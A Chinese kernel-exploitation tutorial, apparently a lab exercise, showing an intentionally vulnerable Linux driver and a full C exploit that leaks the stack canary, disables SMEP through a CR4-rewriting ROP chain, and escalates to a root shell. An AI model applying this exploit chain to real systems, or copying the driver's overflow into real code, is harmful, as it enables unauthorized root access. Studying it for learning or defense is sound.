# how2kernel————第四节ROP-by-栈溢出

## Author：Wenhuo

> 环境：linux-4.4.72
>
> 注：内核编译make menuconfig时注意去掉模块签名验证，方式如下：
>
> 去掉make menuconfig—>Enable loadable kernel module—>Module Signature verification

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>在内核态pwn的栈溢出中，除了常规的canary保护还有其他用户态不存在的保护，比如smep保护：防止内核执行用户空间的代码。要绕过smep保护也很简单，在内核态中可以很轻易的通过gadget（例如mov cv4，regs）指令轻易的修改**（去掉cr4的高位，相当于cr4&=0xFFFF）**，这时候就需要ROP链来达到我们的目的了（建议看这篇前先看看上一篇简单的栈溢出，否则可能不知道如何构造trap frame）。首先来看看漏洞驱动模块：</font></br>

```C
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <asm/uaccess.h>
#include <linux/slab.h> 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("A Kmod");
MODULE_DESCRIPTION("Kernel Module");

static dev_t first; // Global variable for the first device number
static struct cdev c_dev; // Global variable for the character device structure
static struct class *cl; // Global variable for the device class
static char *buffer_var="hello,world";
struct my_device_data {
    struct cdev cdev;
    /* my data starts here */
    //...
    ssize_t len;
    char* buffer;
};

static int vuln_open(struct inode *i, struct file *f)
{
	printk(KERN_INFO "[i] Module vuln: open()\n");
	return 0;
}
 
static int vuln_close(struct inode *i, struct file *f)
{
	printk(KERN_INFO "[i] Module vuln: close()\n");
	return 0;
}

static ssize_t vuln_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
	char buffer[100]={0,};
	strcpy(buffer,"hello,world");
	/*
	if(strlen(buffer_var)>0) {
		printk(KERN_INFO "[i] Module vuln read: %s\n", buffer_var);
		kfree(buffer_var);
		buffer_var=kmalloc(100,GFP_DMA);
		return 0;
	} else {
		return 1;
	}
	*/

	printk(KERN_INFO "[i] Module vuln: read()\n");
	printk(KERN_INFO "buf:%s\n",buf);
	memcpy(buf,buffer,len);

	return 0;
}

static ssize_t vuln_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
	char buffer[100]={0};
	
	if (_copy_from_user(buffer, buf, len))
		return -EFAULT;
	buffer[len-1]='\0';
	
	printk("[i] Module vuln write: %s\n", buffer);
	
	strncpy(buffer_var,buffer,len);
	
	return len;
}
 
static struct file_operations pugs_fops =
{
	.owner = THIS_MODULE,
	.open = vuln_open,
	.release = vuln_close,
	.write = vuln_write,
	.read = vuln_read
};
 
static int __init vuln_init(void) /* Constructor */
{
	buffer_var=kmalloc(100,GFP_DMA);
	printk(KERN_INFO "[i] Module vuln registered");
	if (alloc_chrdev_region(&first, 0, 1, "vuln") < 0)
	{
		return -1;
	}
	if ((cl = class_create(THIS_MODULE, "chardrv")) == NULL)
	{
		unregister_chrdev_region(first, 1);
		return -1;
	}
	if (device_create(cl, NULL, first, NULL, "vuln") == NULL)
	{
		printk(KERN_INFO "[i] Module vuln error");
		class_destroy(cl);
		unregister_chrdev_region(first, 1);
		return -1;
	}
	cdev_init(&c_dev, &pugs_fops);
	if (cdev_add(&c_dev, first, 1) == -1)
	{
		device_destroy(cl, first);
		class_destroy(cl);
		unregister_chrdev_region(first, 1);
		return -1;
	}

	printk(KERN_INFO "[i] <Major, Minor>: <%d, %d>\n", MAJOR(first), MINOR(first));
	return 0;
}
 
static void __exit vuln_exit(void) /* Destructor */
{
	unregister_chrdev_region(first, 3);
	printk(KERN_INFO "Module vuln unregistered");
}
 
module_init(vuln_init);
module_exit(vuln_exit);
 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("blackndoor");
MODULE_DESCRIPTION("Module vuln overflow");
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>原模块[链接是这个](https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric)，只是我编译内核的时候开启了栈保护，懒得重新编译也懒得nop，就直接改了下源代码泄漏canary绕过就好了。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>看完模块源码之后可以发现很简单，是一个很单纯的栈溢出，我们也主要是为了练习ROP利用技巧，能看到这的大佬基本也已经会了用户空间栈溢出的ROP了，所以直接放最终的ROP链，可以直接理解，另外在64-bit下的kernel中有一点需要注意一下：</font></br>

> 在64bit的系统中执行iret指令前需要执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。
>
> ————转自[w0lfzhang's blog](https://www.w0lfzhang.com/2017/08/06/Linux-Kernel-ROP/)

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>ROP链如下：</font></br>

![ROP链](./ROP.png)

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>用mov_cr4_pop_ret的指令关闭smep保护后就可以用get_root这个用户空间的函数进行getshell了，指令与函数内容如下：</font></br>

```assembly
#mov_cr4_pop_ret:
mov cr4,rdi
pop rbp
ret
```

```C
void get_root()
{
	commit_creds(prepare_kernel_cred(0));
	asm("swapgs");
	asm("movq %0,%%rsp"::"r"(&tf));
	asm("iretq");
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>tf跟上一篇里的一样，只是变为了64位的，就需要用64位的内联汇编来赋值，内联汇编的资料我以后再放。完整脚本如下：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>


#define KERNCALL __attribute__((regparm(3)))

void *(*prepare_kernel_cred)(void *) KERNCALL=0xffffffff8109bce0;
void *(*commit_creds)(void *) KERNCALL=0xffffffff8109ba30;
unsigned long pop_rdi_ret=0xffffffff8108e34d;
unsigned long mov_cr4_rdi_pop_rdp_ret=0xffffffff81004d70;
unsigned long swapgs=0xffffffff81060274;

void get_shell()
{
	system("/bin/sh");
}

struct trap_frame {
	void *rip;
	unsigned long cs;
	unsigned long eflags;
	void *rsp;
	unsigned long ss;
}__attribute__((packed));

struct trap_frame tf;

void init_tf_work(void)
{
	asm volatile("movq %%cs,%0;" // tf+8  set cs
	    "pushfq;" //tf+16  set eflags
	    "popq %1;" //tf+16  set eflags
	    "movq %%rsp,%2;"//tf+24  set rsp
	    "movq %%ss,%3;" //tf+32  set ss
	    		:"=r"(tf.cs),"=r"(tf.eflags),
			"=r"(tf.rsp),"=r"(tf.ss));
	tf.rip = &get_shell;
	tf.rsp -= 1024;
}

/*
void trigger_root()
{
	commit_creds(prepare_kernel_cred(0));
	asm("movq %0,%%rsp"::"r"(&tf));
	asm("iretq");
}
*/

void get_root()
{
	commit_creds(prepare_kernel_cred(0));
	asm("swapgs");
	asm("movq %0,%%rsp"::"r"(&tf));
	asm("iretq");
}

int main()
{
	char buf[0x100];
	unsigned long canary;
	int fd=open("/dev/vuln",O_RDWR);

	init_tf_work();
	read(fd,buf,140);
	canary=*(unsigned long*)(buf+100);
	printf("canary:0x%llx\n",canary);

	//trigger smep protect:
	//
	//*(unsigned long*)(buf+124)=(void*)&trigger_smep;
	//write(fd,buf,144);

	unsigned long rop_chain[]={
		pop_rdi_ret,
		0x6f0,
		mov_cr4_rdi_pop_rdp_ret,
		tf.rsp,
		(void*)&get_root
	};
	memcpy(buf+124,rop_chain,sizeof(rop_chain));
	write(fd,buf,sizeof(buf));
	close(fd);

	return 0;
}
```

